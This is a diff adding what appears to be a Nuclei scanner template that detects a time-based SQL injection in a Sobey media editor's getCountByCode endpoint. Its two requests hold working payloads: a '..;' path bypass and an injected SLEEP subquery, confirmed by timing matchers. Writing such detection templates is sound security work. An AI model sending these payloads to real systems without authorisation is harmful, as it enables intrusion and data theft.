@@ -1,0 +1,27 @@
+id: suobei-getCountByCode-sqli
+
+info:
+  name: 索贝融媒体 /sobey-mchEditor/count/getCountByCode SQL注入漏洞
+  author: suobei
+  severity: high
+  tags: suobei,sqli
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{to_lower(rand_base(20))}}"
+http:
+  - raw:
+      - |
+        GET /sobey-mchEditor/js/..;/count/getCountByCode?createDate=2023-01-01%27%20AND%20(SELECT%206067%20FROM%20(SELECT(SLEEP(1)))ZuGP)%20AND%20%27SlgF%27=%27SlgF&orderType=1&status=1&userCode=1&siteCode=1&token=1 HTTP/1.1
+        Host: 
+        
+
+      - |
+        GET /sobey-mchEditor/js/..;/count/getCountByCode?createDate=2023-01-01%27%20AND%20(SELECT%206067%20FROM%20(SELECT(SLEEP(2)))ZuGP)%20AND%20%27SlgF%27=%27SlgF&orderType=1&status=1&userCode=1&siteCode=1&token=1 HTTP/1.1
+        Host: 
+
+    matchers:
+          - type: dsl
+            condition: and
+            dsl:
+              - 'duration_1>=3 && duration_1<=4'
+              - 'duration_2>=6 && duration_2<=8'
